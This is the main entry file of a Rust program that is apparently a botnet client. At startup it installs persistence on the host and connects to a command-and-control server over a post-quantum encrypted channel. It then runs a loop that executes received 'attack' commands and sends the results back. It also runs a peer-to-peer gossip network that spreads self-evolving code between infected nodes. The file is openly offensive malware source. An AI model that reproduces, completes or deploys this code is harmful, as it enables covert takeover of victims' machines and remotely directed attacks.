#![forbid(unsafe_code)]

mod config;
mod communication;
mod commands;
mod crypto;
mod error;
mod persistence;
mod attacks;
mod encryption;
mod utils;
mod p2p;
mod agentic;
mod recon;
mod compute;
mod db;
mod evolution;

use config::FullConfig;
use db::ClientDb;
use communication::connect_to_c2;
use persistence::add_persistence;
use attacks::execute_attack;
use commands::CommandResult;
use error::handle_error;
use tokio::runtime::Runtime;
use std::sync::Arc;

fn main() {
    let config = FullConfig::load();
    add_persistence();

    let db = Arc::new(
        ClientDb::open(&config.database.path)
            .unwrap_or_else(|_| ClientDb::open_memory().expect("in-memory db"))
    );

    let node_id: Vec<u8> = {
        let id = uuid::Uuid::new_v4();
        id.as_bytes().to_vec()
    };

    let rt = Runtime::new().unwrap();
    rt.block_on(async {
        // Spawn the evolutionary soup - a local Tierra/Avida world running on a
        // dedicated thread, fed by network telemetry as its ocean (arXiv:2409.01469).
        let mut evo = evolution::EvolutionEngine::new(node_id.clone());
        eprintln!("[*] Evolution soup spawned");

        let gossip_engine: Option<Arc<p2p::gossip::GossipEngine>> = if config.p2p.enabled {
            let gossip_addr: std::net::SocketAddr = config.p2p.gossip_address.parse()
                .expect("Invalid P2P gossip address");
            let bootstrap: Vec<std::net::SocketAddr> = config.p2p.bootstrap_peers.iter()
                .filter_map(|s| s.parse().ok())
                .collect();
            let peer_mgr = Arc::new(
                p2p::peer::PeerManager::new(gossip_addr, bootstrap, config.p2p.max_peers)
            );
            match p2p::gossip::GossipEngine::new(gossip_addr, peer_mgr).await {
                Ok(engine) => {
                    let engine = Arc::new(engine);
                    engine.start();
                    eprintln!("[*] P2P gossip: {}", config.p2p.gossip_address);
                    Some(engine)
                }
                Err(e) => {
                    eprintln!("[!] P2P failed: {}", e);
                    None
                }
            }
        } else {
            None
        };

        // Background task: periodic evolution cycle and creature migration via gossip.
        if let Some(ref engine) = gossip_engine {
            let engine = Arc::clone(engine);
            tokio::spawn(async move {
                let mut interval = tokio::time::interval(std::time::Duration::from_secs(30));
                loop {
                    interval.tick().await;
                    // Drain incoming creature migrations from gossip
                    let mut incoming = Vec::new();
                    {
                        let cmds = engine.command_rx.read().await;
                        for (id, payload) in cmds.iter() {
                            if id.starts_with("evo:") {
                                if let Ok(migrants) = serde_json::from_slice::<Vec<stalinium_evolution::node::Migrant>>(payload) {
                                    incoming.extend(migrants);
                                }
                            }
                        }
                    }
                    if !incoming.is_empty() {
                        evo.receive_migrants(incoming).await;
                    }

                    // Run an evolution cycle; broadcast emigrants if ready
                    if let Some(emigrants) = evo.cycle().await {
                        if let Ok(payload) = serde_json::to_vec(&emigrants) {
                            engine.broadcast_creatures(payload).await;
                        }
                    }

                    let snap = evo.snapshot();
                    if snap.epoch > 0 && snap.epoch % 50 == 0 {
                        eprintln!(
                            "[*] Evolution: epoch {} pop {} diversity {} genes {} computing {}",
                            snap.epoch, snap.population, snap.diversity, snap.alive_genes, snap.computing
                        );
                    }
                }
            });
        }

        match connect_to_c2(&config.settings).await {
            Ok(mut socket) => {
                let handshake = match crypto::handshake::client_handshake(&mut socket).await {
                    Ok(h) => h,
                    Err(e) => {
                        eprintln!("[!] PQ handshake failed: {}", e);
                        return;
                    }
                };
                let key = handshake.session_key;
                eprintln!("[+] PQ session established");

                loop {
                    let command = match communication::receive_command(&mut socket, &key).await {
                        Ok(cmd) => cmd,
                        Err(e) => {
                            handle_error(e);
                            break;
                        }
                    };

                    let _ = db.insert_command(command.id, &command.command, &command.args);

                    let result_str = match execute_attack(&command).await {
                        Ok(data) => data,
                        Err(e) => format!("Error: {}", e),
                    };

                    let _ = db.update_command_result(command.id, &result_str);

                    let result = CommandResult {
                        id: command.id,
                        result: result_str,
                    };

                    if let Err(e) = communication::send_result(&mut socket, &result, &key).await {
                        handle_error(e);
                        break;
                    }
                }
            }
            Err(e) => handle_error(e),
        }
    });
}
